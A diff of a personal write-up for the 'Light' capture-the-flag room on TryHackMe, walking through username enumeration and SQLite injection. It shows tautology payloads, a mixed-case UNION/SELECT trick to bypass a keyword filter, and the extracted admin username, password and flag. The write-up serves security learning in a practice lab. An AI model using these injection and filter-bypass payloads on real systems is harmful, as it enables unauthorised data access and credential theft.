@@ -1,4 +1,4 @@
-# Light (\*\*pending further experimentations)
+# Light
 
 I started on this challenge with minimal knowledge of SQL/SQLite commands and workings (just the basics as learnt from the TryHackMe course room detailed under the Web Hacking -> SQL Injection section in this gitbook: [https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking/web-hacking/sql-injection](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking/web-hacking/sql-injection)). I have gained ideas and insights from a few online resources and also from _ChatGPT_.
 
@@ -84,7 +84,7 @@ _**Word-lists to try out**_:
 2. `/usr/share/wordlists/seclists/Usernames/Names/malenames-usa-top1000.txt`&#x20;
 3. `/usr/share/wordlists/seclists/Usernames/Names/femalenames-usa-top1000.txt`
 
-I found the username: alice. However this wasn't the admin username. Probably a rookie mistake on my part for not realizing sooner that an SQL injection is likely to be more feasible.&#x20;
+I found the username: _**alice**_. However this wasn't the admin username. Probably a rookie mistake on my part for not realizing sooner that an SQL injection is likely to be more feasible.&#x20;
 
 ### SQL Injection
 
@@ -102,17 +102,19 @@ SELECT * FROM users WHERE name='smokey';
 
 1. _**Force the statement to resolve to true**_
 
-Potentially tricking the database to return all the users
+_Potentially tricking the database to return all the users_
 
 ```sql
 ' OR 1=1 --
 ```
 
+_Hope to resolve to the following in the server side_:
+
 ```sql
 SELECT * FROM users WHERE name='' OR 1=1--';
 ```
 
-**Reponse**: _For strange reasons I can't explain, any input containing /\*, -- or, %0b is not allowed :)_
+**Reponse**: `For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)`
 
 This tells us that comment characters are banned.
 
@@ -122,11 +124,13 @@ This tells us that comment characters are banned.
 ' OR ''='
 ```
 
+_Hope to resolve to the following in the server side_:
+
 ```sql
-SELECT * FROM users WHERE name='' OR ''='';
+SELECT * FROM users WHERE name='' OR ''=''
 ```
 
-This seems to return a password value (that is returned from the _alice_ username).&#x20;
+This seems to return a password value (associated with the _**alice**_ username).&#x20;
 
 
 
@@ -141,11 +145,11 @@ union
 select
 ```
 
-**Reponse**: _Ahh there is a word in there I don't like :(_
+**Reponse**: `Ahh there is a word in there I don't like :(`
 
 3. _**Obfuscation of keywords**_
 
-After pondering for awhile on the error message returned from the statement in point 2 above, I got the idea of using non-standard SQL keyword commands, apart from the conventional fully capitalized, or fully non-capitalized versions (eg. `UNION`, `union`).
+After pondering for awhile on the error message returned from the statement in point 2 above, I got the idea of using non-standard SQL keyword commands, apart from the conventional fully capitalized, or fully non-capitalized versions (`UNION`, `union`).
 
 ```sql
 --**
@@ -181,7 +185,7 @@ Password: CREATE TABLE admintable (
 ' Union Select username from admintable '
 --OUTPUT: Password: TryHackMeAdmin
 
---** Union keyword has funny capitalization, but works nonetheless
+--** NOTE: Union keyword has funny capitalization, but works nonetheless
 ' UnIoN Select password from admintable '
 --OUTPUT: Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
 
@@ -189,43 +193,9 @@ Password: CREATE TABLE admintable (
 ' UNion Select password from admintable where username='TryHackMeAdmin' or '=
 --OUTPUT: Password: mamZtAuMlrsEy5bp6q17
 
-
-
 ```
 
 From the results, I have learnt that SQLite accepts variations of SQL keywords, such as but not limited to: `Union`, `uNion`, `unIon`, `uniOn`, `UNion`, etc. are allowed, and are treated as valid commands.
-
-
-
-
-
-ARCHIVE (pending deletion):
-
-<pre class="language-sql"><code class="lang-sql">-- 1)
---INPUT: ' OR 1=1 
--- Error: unrecognized token:  "' LIMIT 30" 
-
---3) 
---INPUT: ' OR 1=1;
---Pause with no response
-
---2) 
---INPUT: 'UNION 
-<strong>--Ahh there is a word in there I don't like :(
-</strong>
---3)
---INPUT: 'SELECT
---Ahh there is a word in there I don't like :(
-
---4)
-<strong>--INPUT: '--
-</strong>--For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
-
---5) 
---INPUT: '' LIMIT 30 OR '1=1;
---Error: near "LIMIT": syntax error
-
-</code></pre>
 
 
 
